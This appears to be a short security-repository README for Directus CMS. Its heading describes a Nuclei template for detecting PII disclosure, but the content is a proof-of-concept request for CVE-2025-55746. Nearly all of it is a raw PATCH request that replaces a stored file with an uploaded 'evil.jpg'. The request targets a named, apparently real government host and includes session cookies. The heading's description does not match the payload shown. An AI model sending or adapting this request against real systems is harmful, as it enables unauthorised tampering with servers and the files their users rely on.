# Directus CMS PII leak
Nuclei template to detect unauthenticated user information disclosure on Directus CMS instances

# POC FOR CVE-2025-55746
```
PATCH /files/UUID HTTP/1.1
Host: cms.nea.gov.sg
Content-Type: multipart/form-data; boundary=----Boundary
Content-Length: 342
Connection: close
sec-ch-ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _fbp=fb.2.1758361444036.451620723638737860; _ga_59DNK15E1M=GS2.3.s1758445647$o3$g0$t1758445662$j45$l0$h0; _ga=GA1.1.1755464778.1758361439; _ga_TT42DB03GJ=GS2.1.s1769003876$o3$g1$t1769004837$j60$l0$h0; _ga_SQJ6PNGZV0=GS2.1.s1769003969$o2$g1$t1769004885$j60$l0$h0; _sp_id.8ff2=29f0f87e-bbc5-46b5-871a-bbdbdaaa6762.1771760707.1.1771760736..aae9759f-623e-48e1-84b3-559dce91fa91..777aaa53-f7e5-4ce8-8498-d1198dc737cf.1771760736163.1

------Boundary
Content-Disposition: form-data; name="filename_disk"

00068ba1-4ad9-4651-b8ff-5e2ca547f65c.jpg
------Boundary
Content-Disposition: form-data; name="filename_download"

evil.jpg
------Boundary
Content-Disposition: form-data; name="file"; filename="evil.jpg"
Content-Type: image/jpeg

CONTENT
------Boundary--
```
